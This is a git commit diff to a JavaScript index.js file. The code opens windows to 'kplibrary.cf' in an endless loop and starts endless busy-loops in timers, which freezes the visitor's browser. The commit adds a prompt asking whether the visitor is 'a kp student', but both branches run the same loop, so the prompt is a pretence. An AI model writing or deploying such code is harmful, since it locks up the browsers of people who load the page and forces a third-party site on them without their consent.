b1de125d2ebe13cfa7ca16449cf084d541342373
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 15:37:15 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,5 @@
-
+var answer = confirm ("Are you a kp student")
+if (answer)
 while(true)
 {
 window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
@@ -6,3 +7,13 @@ setTimeout(function(){
 for(var i = 0; i === i; i++) {}
 }, 50); 
 }
+else
+while(true)
+{
+window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
+setTimeout(function(){
+for(var i = 0; i === i; i++) {}
+}, 50); 
+}
+
+
